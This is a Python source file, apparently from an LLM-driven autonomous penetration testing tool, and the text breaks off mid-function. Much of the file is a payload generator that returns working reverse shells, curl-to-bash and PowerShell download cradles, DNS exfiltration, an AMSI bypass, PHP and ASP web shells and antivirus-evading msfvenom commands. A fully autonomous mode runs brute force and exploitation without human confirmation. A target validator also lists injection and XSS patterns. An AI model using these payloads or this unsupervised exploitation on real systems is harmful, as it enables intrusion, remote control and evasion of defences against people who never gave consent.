"""
AI-Powered Autonomous Penetration Testing Agent
Uses LLM API (OpenAI/Anthropic/etc.) for intelligent decision-making
Orchestrates existing Scorpion tools based on findings and goals
"""
import asyncio
import json
import os
import re
import urllib.parse
from typing import List, Dict, Optional, Any
from dataclasses import dataclass, asdict
from datetime import datetime
import httpx
from enum import Enum

from .scanner import async_port_scan, async_syn_scan, async_udp_scan, async_advanced_scan
from .ssl_analyzer import analyze_ssl
from .takeover import takeover_scan
from .api import api_probe
from .recon import recon
from .tech import detect_tech
from .web_pentest import AdvancedWebTester
from .os_fingerprint import OSFingerprinter
# Note: payload_generator module not yet implemented - using stub
# from .payload_generator import PayloadGenerator
from .bruteforce import AuthBruteForcer
from .fuzzer import AdvancedFuzzer
from .dirbuster import dirbust_scan
from .crawler import crawl
from .nuclei_wrapper import NucleiScanner
from .aggressive_exploit_config import AGGRESSIVE_CONFIG
from .cloud import cloud_audit
from .k8s import k8s_audit


# Stub for PayloadGenerator until module is implemented
class PayloadGenerator:
    """Payload generator with firewall evasion techniques"""
    
    def generate(self, *args, **kwargs):
        return {"error": "Use specific methods like generate_reverse_shell()"}
    
    def generate_reverse_shell(self, lhost, lport, shell_type="bash", encoder=None, evasion="standard"):
        """Generate reverse shell payloads with firewall evasion techniques"""
        
        # Standard shells (multiple variants for robustness)
        standard_shells = {
            "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "bash_alt": f"0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196",
            "bash_fifo": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
            "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "python3": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "python_pty": f"python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
            "nc": f"nc -e /bin/sh {lhost} {lport}",
            "nc_alt": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
            "ncat": f"ncat {lhost} {lport} -e /bin/bash",
            "php": f"<?php $sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\"); ?>",
            "php_alt": f"<?php $sock=fsockopen(\"{lhost}\",{lport});shell_exec('/bin/sh -i <&3 >&3 2>&3'); ?>",
            "perl": f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            "ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            "socat": f"socat TCP:{lhost}:{lport} EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",
        }
        
        # HTTP/HTTPS tunneling payloads (bypass firewall using common ports) - Multi-stage delivery
        http_shells = {
            "python_http": f"python -c 'import urllib.request,subprocess,os;r=urllib.request.urlopen(\"http://{lhost}:{lport}/shell\");exec(r.read())'",
            "python3_http": f"python3 -c 'import urllib.request,subprocess,os;r=urllib.request.urlopen(\"http://{lhost}:{lport}/shell\");exec(r.read())'",
            "curl_bash": f"curl -s http://{lhost}:{lport}/shell.sh | bash",
            "curl_https": f"curl -k -s https://{lhost}:{lport}/shell.sh | bash",
            "wget_bash": f"wget -qO- http://{lhost}:{lport}/shell.sh | bash",
            "wget_https": f"wget --no-check-certificate -qO- https://{lhost}:{lport}/shell.sh | bash",
            "powershell_http": f"powershell -w hidden -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/shell')\"",
            "powershell_https": f"powershell -w hidden -ep bypass -c \"[System.Net.ServicePointManager]::ServerCertificateValidationCallback={{$true}};IEX(New-Object Net.WebClient).DownloadString('https://{lhost}:{lport}/shell')\"",
            "powershell_encoded": f"powershell -w hidden -ep bypass -enc <BASE64_PAYLOAD>",
            "curl_multi_stage": f"curl -s http://{lhost}:{lport}/stage1.sh | sh -c 'curl -s http://{lhost}:{lport}/stage2.sh | bash'",
        }
        
        # DNS tunneling (extreme evasion)
        dns_shells = {
            "python_dns": f"python -c 'import socket,subprocess,base64;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);[s.sendto(base64.b64encode(subprocess.check_output(c,shell=True)),(\"{lhost}\",{lport})) for c in [\"whoami\",\"pwd\"]]'",
        }
        
        # SSL/TLS encrypted shells (evade DPI)
        ssl_shells = {
            "openssl": f"mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {lhost}:{lport} > /tmp/s; rm /tmp/s",
            "ncat_ssl": f"ncat --ssl {lhost} {lport} -e /bin/bash",
        }
        
        # Choose payload based on evasion level
        if evasion == "http":
            shells = http_shells
        elif evasion == "dns":
            shells = dns_shells
        elif evasion == "ssl":
            shells = ssl_shells
        else:
            shells = standard_shells
        
        payload = shells.get(shell_type.lower(), shells.get(list(shells.keys())[0]))
        return {
            "payload": payload,
            "shell_type": shell_type,
            "lhost": lhost,
            "lport": lport,
            "evasion": evasion,
            "description": f"{shell_type} reverse shell ({evasion} evasion)",
            "listener_hint": self._get_listener_hint(evasion, lport)
        }
    
    def _get_listener_hint(self, evasion, lport):
        """Get listener setup hint based on evasion technique"""
        if evasion == "http":
            return f"Start HTTP server: python3 -m http.server {lport} or nc -lvnp {lport}"
        elif evasion == "ssl":
            return f"Start SSL listener: openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes && openssl s_server -quiet -key key.pem -cert cert.pem -port {lport}"
        elif evasion == "dns":
            return f"Start DNS listener on port {lport}"
        else:
            return f"nc -lvnp {lport}"
    
    def generate_bind_shell(self, lport, shell_type="bash"):
        shells = {"bash": f"nc -lvp {lport} -e /bin/bash", "nc": f"nc -lvp {lport} -e /bin/sh"}
        return {"payload": shells.get(shell_type.lower(), shells["bash"]), "shell_type": shell_type, "lport": lport}
    
    def generate_web_shell(self, shell_type="php", obfuscate=False):
        shells = {
            "php": "<?php system($_GET['cmd']); ?>",
            "php_obfuscated": "<?php @eval($_POST['cmd']); ?>",
            "asp": "<%response.write CreateObject(\"WScript.Shell\").Exec(Request.QueryString(\"cmd\")).StdOut.Readall()%>"
        }
        key = f"{shell_type}_obfuscated" if obfuscate else shell_type
        return {"payload": shells.get(key, shells["php"]), "shell_type": shell_type, "obfuscated": obfuscate}
    
    def generate_powershell_payload(self, lhost, lport, encoder="base64", evasion="http"):
        """PowerShell payloads with AMSI bypass and evasion"""
        # AMSI bypass + download cradle
        amsi_bypass = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);"
        
        if evasion == "https":
            payload = f"powershell -w hidden -ep bypass -c \"{amsi_bypass}[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;IEX(New-Object Net.WebClient).DownloadString('https://{lhost}:{lport}/shell.ps1')\""
        else:
            payload = f"powershell -w hidden -ep bypass -c \"{amsi_bypass}IEX(New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/shell.ps1')\""
        
        return {"payload": payload, "lhost": lhost, "lport": lport, "evasion": evasion, "amsi_bypass": True}
    
    def generate_msfvenom_command(self, payload_type, lhost, lport, platform="linux", arch="x64", format="elf", evasion=False):
        """Generate msfvenom command with advanced evasion and encoding options"""
        # Use HTTPS payload for evasion with multiple encoding layers
        if evasion:
            if platform == "windows":
                payload = f"windows/x{arch}/meterpreter/reverse_https"
                # Multi-layer encoding for AV evasion
                evasion_opts = f"-e x86/shikata_ga_nai -i 10 -e x86/countdown -i 5"
            else:
                payload = f"linux/x{arch}/meterpreter/reverse_https"
                evasion_opts = f"-e x86/shikata_ga_nai -i 7"
        else:
            payload = f"{platform}/x{arch}/meterpreter/reverse_tcp"
            evasion_opts = ""
        
        # Generate multiple variants for redundancy
        variants = [
            {
                "command": f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} {evasion_opts} -f {format} -o payload.{format}",
                "description": "Primary payload"
            },
            {
                "command": f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} {evasion_opts} -f c -o payload.c && gcc -o payload payload.c",
                "description": "Compiled C binary (harder to detect)"
            },
            {
                "command": f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} {evasion_opts} -f raw | base64",
                "description": "Base64 encoded for transfer"
            }
        ]
        
        return {
            "command": f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} {evasion_opts} -f {format} -o payload.{format}",
            "payload": payload,
            "platform": platform,
            "arch": arch,
            "format": format,
            "evasion": evasion,
            "variants": variants,
            "listener": f"msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {lport}; set ExitOnSession false; exploit -j\"",
            "setup_instructions": f"1. Generate: msfvenom -p {payload} LHOST={lhost} LPORT={lport} {evasion_opts} -f {format} -o payload.{format}\n2. Host: python3 -m http.server 8000\n3. Download on target: wget http://{lhost}:8000/payload.{format}\n4. Execute: chmod +x payload.{format} && ./payload.{format}"
        }
from .container_sec import container_audit


class PrimaryGoal(str, Enum):
    COMPREHENSIVE = "comprehensive_assessment"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    DATA_ACCESS = "data_access"
    NETWORK_MAPPING = "network_mapping"
    WEB_EXPLOITATION = "web_exploitation"
    SHELL_ACCESS = "gain_shell_access"
    VULN_DISCOVERY = "vulnerability_discovery"
    INFRASTRUCTURE = "infrastructure_assessment"
    CLOUD_SECURITY = "cloud_security_audit"
    API_SECURITY = "api_security_testing"


class AutonomyLevel(str, Enum):
    SUPERVISED = "supervised"  # Asks for confirmation before each action
    SEMI_AUTONOMOUS = "semi_autonomous"  # Asks before high-risk actions
    FULLY_AUTONOMOUS = "fully_autonomous"  # Executes without confirmation (DANGEROUS)


class StealthLevel(str, Enum):
    LOW = "low"  # Fast, noisy scans
    MODERATE = "moderate"  # Balanced approach
    HIGH = "high"  # Slow, stealthy scans


class RiskTolerance(str, Enum):
    LOW = "low"  # Only passive/safe actions
    MEDIUM = "medium"  # Active scanning, no exploitation
    HIGH = "high"  # Full exploitation (requires authorization)


@dataclass
class AIPentestConfig:
    """Configuration for AI penetration test"""
    target: str
    primary_goal: PrimaryGoal
    secondary_goals: List[str]
    time_limit: int  # minutes
    stealth_level: StealthLevel
    autonomy_level: AutonomyLevel
    risk_tolerance: RiskTolerance
    ai_provider: str  # openai, anthropic, custom
    api_key: str
    api_endpoint: Optional[str] = None
    model: str = "gpt-4"
    learning_mode: bool = False
    max_iterations: int = 10
    custom_instructions: Optional[str] = None  # User-provided custom guidance
    use_aggressive_config: bool = False  # Enable aggressive exploitation settings from aggressive_exploit_config.py


@dataclass
class Finding:
    """Represents a security finding"""
    timestamp: str
    tool: str
    severity: str
    category: str
    description: str
    details: Dict[str, Any]
    exploitation_potential: str
    recommended_action: str
    test_payload: Optional[str] = None  # Payload to test/verify the vulnerability
    poc_steps: Optional[List[str]] = None  # Step-by-step PoC reproduction
    remediation_code: Optional[str] = None  # Code fix/patch suggestion
    cve_references: Optional[List[str]] = None  # Related CVE IDs
    mitigation_priority: Optional[str] = None  # immediate, high, medium, low


@dataclass
class AgentAction:
    """Represents an action taken by the AI agent"""
    timestamp: str
    action_type: str
    tool: str
    parameters: Dict[str, Any]
    reasoning: str
    risk_level: str


class AIProvider:
    """Handles communication with AI providers (OpenAI, Anthropic, etc.)"""
    
    def __init__(self, provider: str, api_key: str, model: str, endpoint: Optional[str] = None):
        self.provider = provider.lower()
        self.api_key = api_key
        self.model = model
        self.endpoint = endpoint
        self.client = httpx.AsyncClient(timeout=60.0)
        
        # Validate API key format early
        self._validate_api_key()
    
    def _validate_api_key(self):
        """Validate API key format to catch common errors early"""
        if not self.api_key or len(self.api_key) < 10:
            raise ValueError(
                f"‚ùå INVALID API KEY: API key is too short or empty.\\n\\n"
                f"Get a FREE API key:\\n"
                f"‚Ä¢ GitHub Models (FREE): https://github.com/marketplace/models ‚Üí Copy token (starts with 'ghp_')\\n"
                f"‚Ä¢ OpenAI (Paid): https://platform.openai.com/api-keys ‚Üí Create key (starts with 'sk-proj-')\\n\\n"
                f"Set your key:\\n"
                f"‚Ä¢ Linux/macOS: export SCORPION_AI_API_KEY='your-key'\\n"
                f"‚Ä¢ Windows: $env:SCORPION_AI_API_KEY='your-key'\\n"
                f"‚Ä¢ Or use .env file: echo \\\"SCORPION_AI_API_KEY=your-key\\\" >> .env"
            )
        
        # Check if API key format matches provider
        if self.provider == "github" and not self.api_key.startswith("ghp_"):
            print(
                f"‚ö†Ô∏è  WARNING: Provider is 'github' but API key doesn't start with 'ghp_'\\n"
                f"   Key starts with: {self.api_key[:10]}...\\n"
                f"   Expected GitHub token format: ghp_xxxxxxxxxxxxx\\n"
                f"   Get token at: https://github.com/marketplace/models"
            )
        elif self.provider == "openai" and not self.api_key.startswith("sk-"):
            print(
                f"‚ö†Ô∏è  WARNING: Provider is 'openai' but API key doesn't start with 'sk-'\\n"
                f"   Key starts with: {self.api_key[:10]}...\\n"
                f"   If you're using GitHub Models, add: --ai-provider github"
            )
        elif self.provider == "anthropic" and not self.api_key.startswith("sk-ant-"):
            print(
                f"‚ö†Ô∏è  WARNING: Provider is 'anthropic' but API key doesn't start with 'sk-ant-'\\n"
                f"   Key starts with: {self.api_key[:10]}..."
            )
        
    async def query(self, system_prompt: str, user_prompt: str, temperature: float = 0.7) -> str:
        """Query the AI provider"""
        try:
            if self.provider == "openai":
                return await self._query_openai(system_prompt, user_prompt, temperature)
            elif self.provider == "anthropic":
                return await self._query_anthropic(system_prompt, user_prompt, temperature)
            elif self.provider == "github":
                return await self._query_github(system_prompt, user_prompt, temperature)
            elif self.provider == "custom":
                return await self._query_custom(system_prompt, user_prompt, temperature)
            else:
                raise ValueError(f"Unsupported AI provider: {self.provider}")
        except Exception as e:
            error_msg = str(e)
            
            # Provide helpful error messages based on error type
            if "404" in error_msg and self.provider == "openai":
                raise Exception(
                    f"OpenAI API returned 404 - your API key may be invalid or incomplete.\n"
                    f"Current provider: {self.provider}\n"
                    f"API key starts with: {self.api_key[:10]}...\n\n"
                    f"Solutions:\n"
                    f"1. Verify your OpenAI API key at: https://platform.openai.com/api-keys\n"
                    f"2. If using GitHub Models, your key should start with 'ghp_'\n"
                    f"3. Try explicitly setting provider: --ai-provider github\n"
                    f"4. Check your .env file or SCORPION_AI_API_KEY variable"
                )
            elif "401" in error_msg or "403" in error_msg:
                raise Exception(
                    f"Authentication failed with {self.provider}.\n"
                    f"API key starts with: {self.api_key[:10]}...\n\n"
                    f"Solutions:\n"
                    f"1. GitHub Models: Get token from https://github.com/marketplace/models\n"
                    f"2. OpenAI: Get key from https://platform.openai.com/api-keys\n"
                    f"3. Verify key is correct and not expired\n"
                    f"4. Try: export SCORPION_AI_API_KEY='your-correct-key'"
                )
            elif "429" in error_msg:
                raise Exception(
                    f"Rate limit exceeded for {self.provider}.\n"
                    f"Solutions:\n"
                    f"1. Wait 1-2 minutes before retrying\n"
                    f"2. Use --time-limit to reduce scan speed\n"
                    f"3. GitHub Models: 15-60 requests/min limit\n"
                    f"4. OpenAI: Check usage at https://platform.openai.com/usage"
                )
            else:
                raise Exception(f"AI provider ({self.provider}) error: {error_msg}")
    
    async def _query_openai(self, system_prompt: str, user_prompt: str, temperature: float) -> str:
        """Query OpenAI API"""
        url = self.endpoint or "https://api.openai.com/v1/chat/completions"
        headers = {
            "Authorization": f"Bearer {self.api_key}",
            "Content-Type": "application/json"
        }
        data = {
            "model": self.model,
            "messages": [
                {"role": "system", "content": system_prompt},
                {"role": "user", "content": user_prompt}
            ],
            "temperature": temperature,
            "max_tokens": 2000
        }
        
        try:
            response = await self.client.post(url, headers=headers, json=data)
            response.raise_for_status()
            result = response.json()
        except Exception as e:
            raise Exception(f"OpenAI API request failed: {str(e)}")
        
        # Comprehensive defensive None checks
        if result is None:
            raise Exception("OpenAI returned None response")
        
        if not isinstance(result, dict):
            raise Exception(f"OpenAI returned invalid type: {type(result)}")
        
        if "choices" not in result:
            raise Exception(f"OpenAI response missing 'choices' field: {result}")
        
        if result["choices"] is None or len(result["choices"]) == 0:
            raise Exception(f"OpenAI returned empty choices array: {result}")
        
        first_choice = result["choices"][0]
        if first_choice is None:
            raise Exception(f"OpenAI first choice is None: {result}")
        
        if "message" not in first_choice or first_choice["message"] is None:
            raise Exception(f"OpenAI choice missing message: {result}")
        
        if "content" not in first_choice["message"] or first_choice["message"]["content"] is None:
            raise Exception(f"OpenAI message missing content: {result}")
        
        content = first_choice["message"]["content"]
        if not isinstance(content, str):
            raise Exception(f"OpenAI content is not string: {type(content)}")
        
        return content
    
    async def _query_anthropic(self, system_prompt: str, user_prompt: str, temperature: float) -> str:
        """Query Anthropic Claude API"""
        url = self.endpoint or "https://api.anthropic.com/v1/messages"
        headers = {
            "x-api-key": self.api_key,
            "anthropic-version": "2023-06-01",
            "Content-Type": "application/json"
        }
        data = {
            "model": self.model,
            "max_tokens": 2000,
            "temperature": temperature,
            "system": system_prompt,
            "messages": [
                {"role": "user", "content": user_prompt}
            ]
        }
        
        response = await self.client.post(url, headers=headers, json=data)
        response.raise_for_status()
        result = response.json()
        
        # Defensive None checks
        if not result or "content" not in result or not result["content"]:
            raise Exception(f"Anthropic returned empty/invalid response: {result}")
        if "text" not in result["content"][0]:
            raise Exception(f"Anthropic response missing text: {result}")
        
        return result["content"][0]["text"]
    
    async def _query_github(self, system_prompt: str, user_prompt: str, temperature: float) -> str:
        """Query GitHub Models API (OpenAI-compatible)"""
        url = self.endpoint or "https://models.inference.ai.azure.com/chat/completions"
        headers = {
            "Authorization": f"Bearer {self.api_key}",
            "Content-Type": "application/json"
        }
        data = {
            "model": self.model,
            "messages": [
                {"role": "system", "content": system_prompt},
                {"role": "user", "content": user_prompt}
            ],
            "temperature": temperature,
            "max_tokens": 2000,
            "top_p": 1.0
        }
        
        try:
            response = await self.client.post(url, headers=headers, json=data)
            response.raise_for_status()
            result = response.json()
        except Exception as e:
            raise Exception(f"GitHub Models API request failed: {str(e)}")
        
        # Comprehensive defensive None checks
        if result is None:
            raise Exception("GitHub Models returned None response")
        
        if not isinstance(result, dict):
            raise Exception(f"GitHub Models returned invalid type: {type(result)}")
        
        if "choices" not in result:
            raise Exception(f"GitHub Models response missing 'choices' field: {result}")
        
        if result["choices"] is None or len(result["choices"]) == 0:
            raise Exception(f"GitHub Models returned empty choices array: {result}")
        
        first_choice = result["choices"][0]
        if first_choice is None:
            raise Exception(f"GitHub Models first choice is None: {result}")
        
        if "message" not in first_choice or first_choice["message"] is None:
            raise Exception(f"GitHub Models choice missing message: {result}")
        
        if "content" not in first_choice["message"] or first_choice["message"]["content"] is None:
            raise Exception(f"GitHub Models message missing content: {result}")
        
        content = first_choice["message"]["content"]
        if not isinstance(content, str):
            raise Exception(f"GitHub Models content is not string: {type(content)}")
        
        return content
    
    async def _query_custom(self, system_prompt: str, user_prompt: str, temperature: float) -> str:
        """Query custom OpenAI-compatible endpoint"""
        if not self.endpoint:
            raise ValueError("Custom provider requires endpoint URL")
        
        headers = {
            "Authorization": f"Bearer {self.api_key}",
            "Content-Type": "application/json"
        }
        data = {
            "model": self.model,
            "messages": [
                {"role": "system", "content": system_prompt},
                {"role": "user", "content": user_prompt}
            ],
            "temperature": temperature,
            "max_tokens": 2000
        }
        
        response = await self.client.post(self.endpoint, headers=headers, json=data)
        response.raise_for_status()
        
        # Handle Ollama streaming response (multiple JSON objects)
        content = response.text
        if '\n' in content and content.count('{') > 1:
            # Ollama streaming format - parse last complete JSON
            lines = [line.strip() for line in content.strip().split('\n') if line.strip()]
            for line in reversed(lines):
                try:
                    result = json.loads(line)
                    if "message" in result and "content" in result["message"]:
                        return result["message"]["content"]
                    elif "response" in result:
                        return result["response"]
                except json.JSONDecodeError:
                    continue
        
        # Standard JSON response
        result = response.json()
        
        # Defensive None check
        if not result:
            raise Exception(f"Custom endpoint returned empty/invalid response: {result}")
        
        # Handle different response formats
        if "choices" in result and result["choices"]:
            if "message" not in result["choices"][0] or "content" not in result["choices"][0]["message"]:
                raise Exception(f"Custom endpoint response missing content: {result}")
            return result["choices"][0]["message"]["content"]
        elif "message" in result and "content" in result["message"]:
            return result["message"]["content"]
        elif "response" in result:
            return result["response"]
        elif "content" in result and result["content"]:
            if "text" not in result["content"][0]:
                raise Exception(f"Custom endpoint response missing text: {result}")
            return result["content"][0]["text"]
        else:
            raise ValueError(f"Unexpected API response format: {result}")
    
    async def close(self):
        """Close the HTTP client"""
        await self.client.aclose()


class AIPentestAgent:
    """Autonomous AI-powered penetration testing agent with hybrid execution"""
    
    def __init__(self, config: AIPentestConfig):
        self.config = config
        # Validate target before processing
        self._validate_target(config.target)
        # Parse target to extract host and port
        self.target_host, self.target_port = self._parse_target(config.target)
        self.findings: List[Finding] = []
        self.actions: List[AgentAction] = []
        self.ai_provider = AIProvider(
            config.ai_provider,
            config.api_key,
            config.model,
            config.api_endpoint
        )
        self.start_time = datetime.now()
        self.iteration = 0
        self.knowledge_base: Dict[str, Any] = {}
        
        # Apply aggressive config if enabled (HIGH risk or explicit flag)
        if config.use_aggressive_config or config.risk_tolerance == RiskTolerance.HIGH:
            self._apply_aggressive_config()
        
        # Predefined tool sequence for hybrid mode (reduces API calls by 85%)
        # Flow: Discovery ‚Üí Enumeration ‚Üí Vulnerability Testing ‚Üí Exploitation (if HIGH risk)
        self.predefined_sequence = [
            {"tool": "recon", "params": {}, "reasoning": "Initial reconnaissance (DNS, WHOIS, subdomains)"},
            {"tool": "tech_detect", "params": {}, "reasoning": "Identify technology stack (frameworks, CMS, CDN, WAF)"},
            {"tool": "os_fingerprint", "params": {}, "reasoning": "Identify operating system for payload targeting"},
            {"tool": "port_scan", "params": {}, "reasoning": "Discover all open ports (TCP SYN scan)"},
            {"tool": "advanced_scan", "params": {"scan_type": "service_enum"}, "reasoning": "Enumerate services, versions, and banners on open ports"},
            {"tool": "nuclei", "params": {"tags": ["default-login", "cve", "exposure", "owasp"], "severity": ["critical", "high", "medium"]}, "reasoning": "Template-based CVE/vulnerability scan (8900+ checks, no API)"},
            {"tool": "web_pentest", "params": {"tests": ["sqli", "xss", "rce", "ssrf", "lfi", "command_injection", "xxe", "ssti"]}, "reasoning": "Deep web vulnerability testing (OWASP Top 10 + RCE)"},
            {"tool": "dirbuster", "params": {}, "reasoning": "Discover hidden endpoints, admin panels, and upload directories"},
        ]
        
        # Add exploitation steps if HIGH risk tolerance
        if config.risk_tolerance == RiskTolerance.HIGH:
            self.predefined_sequence.extend([
                {"tool": "bruteforce", "params": {"services": ["ssh", "ftp", "http"]}, "reasoning": "üî• EXPLOITATION: Brute force discovered services with default/common credentials"},
                {"tool": "exploit_vuln", "params": {"lhost": "ATTACKER_IP", "lport": 4444}, "reasoning": "üî• EXPLOITATION: Actively exploit discovered RCE/SQLi/File Upload vulnerabilities to GAIN SHELL"},
                {"tool": "payload_generate", "params": {"lhost": "ATTACKER_IP", "lport": 4444}, "reasoning": "üî• EXPLOITATION: Generate multiple payload types (reverse/bind shells, web shells)"},
            ])
            print(f"  [EXPLOITATION MODE] Added {len(self.predefined_sequence) - 8} exploitation steps to sequence")
        # After predefined sequence, AI takes over for intelligent post-exploitation
        self.sequence_index = 0
        self.use_predefined = True  # Start with predefined sequence
        self.consecutive_api_failures = 0
        
        # Decision cache to avoid redundant API calls
        self.decision_cache: Dict[str, Dict] = {}
        self.last_findings_hash = ""
        
        # Aggressive config settings (initialized if enabled)
        self.exploit_attempts_per_vuln = 3
        self.exploit_timeout = 60
        self.parallel_exploits = 1
        self.connection_timeout = 30
        self.http_timeout = 30
    
    def _apply_aggressive_config(self):
        """Apply aggressive exploitation settings from aggressive_exploit_config.py"""
        print(f"  [AGGRESSIVE MODE] Applying maximum exploitation settings...")
        
        # Exploitation settings
        self.exploit_attempts_per_vuln = AGGRESSIVE_CONFIG["max_exploit_attempts_per_vuln"]
        self.exploit_timeout = AGGRESSIVE_CONFIG["exploit_timeout"]
        self.parallel_exploits = AGGRESSIVE_CONFIG["max_parallel_exploits"]
        
        # Speed settings
        self.connection_timeout = AGGRESSIVE_CONFIG["connection_timeout"]
        self.http_timeout = AGGRESSIVE_CONFIG["http_timeout"]
        
        # Shell strategies
        self.shell_strategies = AGGRESSIVE_CONFIG["shell_strategies"]
        self.file_upload_extensions = AGGRESSIVE_CONFIG["file_upload_extensions"]
        
        # Payload settings
        self.use_obfuscation = AGGRESSIVE_CONFIG["use_obfuscation"]
        self.use_polyglot_payloads = AGGRESSIVE_CONFIG["use_polyglot_payloads"]
        
        print(f"  [AGGRESSIVE] Exploit attempts per vuln: {self.exploit_attempts_per_vuln}")
        print(f"  [AGGRESSIVE] Parallel exploits: {self.parallel_exploits}")
        print(f"  [AGGRESSIVE] Shell strategies: {len(self.shell_strategies)}")
        print(f"  [AGGRESSIVE] File upload extensions: {len(self.file_upload_extensions)}")
    
    def _validate_target(self, target: str) -> bool:
        """Validate target is properly formatted and safe from injection attacks
        
        Args:
            target: Target host/domain to validate
            
        Returns:
            bool: True if valid
            
        Raises:
            ValueError: If target is invalid or contains dangerous characters
        """
        if not target or not target.strip():
            raise ValueError("Target cannot be empty")
        
        target = target.strip()
        
        # Remove protocol for validation if present
        clean_target = re.sub(r'^https?://', '', target)
        
        # Remove port for domain/IP validation if present
        host_part = clean_target.split(':')[0]
        
        # Remove trailing path if present
        host_part = host_part.split('/')[0]
        
        # Check for command injection attempts
        dangerous_chars = [';', '&', '|', '`', '$', '(', ')', '{', '}', '[', ']', '<', '>', '\n', '\r']
        for char in dangerous_chars:
            if char in host_part:
                raise ValueError(f"Target contains dangerous character '{char}' - possible injection attempt")
        
        # Check for SQL injection attempts
        sql_keywords = ["'--", "';--", '";--', "' OR '", '" OR "', 'UNION SELECT', 'DROP TABLE']
        for keyword in sql_keywords:
            if keyword.lower() in host_part.lower():
                raise ValueError(f"Target contains SQL injection pattern '{keyword}'")
        
        # Check for XSS attempts
        xss_patterns = ['<script', 'javascript:', 'onerror=', 'onload=']
        for pattern in xss_patterns:
            if pattern.lower() in host_part.lower():
                raise ValueError(f"Target contains XSS pattern '{pattern}'")
        
        # Validate domain format (RFC 1123)
        # Allows: letters, numbers, hyphens, dots
        # Domain labels: 1-63 chars, start/end with alphanumeric
        domain_pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$'
        
        # Validate IPv4 format
        ipv4_pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
        
        # Validate IPv6 format (simplified)
        ipv6_pattern = r'^([0-9a-fA-F]{0,4}:){2,7}[0-9a-fA-F]{0,4}$'
        
        # Check if it matches any valid format
        is_domain = re.match(domain_pattern, host_part)
        is_ipv4 = re.match(ipv4_pattern, host_part)
        is_ipv6 = re.match(ipv6_pattern, host_part)
        is_localhost = host_part.lower() in ['localhost', '127.0.0.1', '::1']
        
        if not (is_domain or is_ipv4 or is_ipv6 or is_localhost):
            raise ValueError(
                f"Invalid target format: '{host_part}'\n"
                f"Expected: domain (example.com), IPv4 (192.168.1.1), IPv6 (::1), or localhost"
            )
        
        # Additional IPv4 validation (range check)
        if is_ipv4:
            octets = host_part.split('.')
            for octet in octets:
                value = int(octet)
                if value < 0 or value > 255:
                    raise ValueError(f"Invalid IPv4 address: octet {value} out of range (0-255)")
        
        # Validate port if present
        if ':' in clean_target and not is_ipv6:
            parts = clean_target.split(':')
            if len(parts) > 2:  # Not a simple host:port
                raise ValueError("Invalid target format with port")
            
            port_str = parts[-1].split('/')[0]  # Remove path after port
            try:
                port = int(port_str)
                if port < 1 or port > 65535:
                    raise ValueError(f"Invalid port number: {port} (must be 1-65535)")
            except ValueError:
                raise ValueError(f"Invalid port number: '{port_str}' is not a valid integer")
        
        # Check length constraints
        if len(host_part) > 253:  # Max domain length
            raise ValueError(f"Target too long: {len(host_part)} chars (max 253)")
        
        # Check for suspicious patterns
        suspicious_patterns = [
            r'\.\.',  # Directory traversal
            r'%[0-9a-fA-F]{2}',  # URL encoding (potential obfuscation)
            r'\\x[0-9a-fA-F]{2}',  # Hex encoding
            r'eval\(',  # Code execution
            r'exec\(',  # Code execution
        ]
        
        for pattern in suspicious_patterns:
            if re.search(pattern, target):
                raise ValueError(f"Target contains suspicious pattern (potential attack): {pattern}")
        
        return True
    
    def _parse_target(self, target: str) -> tuple:
        """Parse target to extract host and optional port"""
        # Remove protocol if present
        if "://" in target:
            target = target.split("://", 1)[1]
        
        # Remove trailing path if present
        if "/" in target:
            target = target.split("/", 1)[0]
        
        # Check if port is specified
        if ":" in target and not target.count(":") > 1:  # Not IPv6
            host, port_str = target.rsplit(":", 1)
            try:
                port = int(port_str)
                return host, port
            except ValueError:
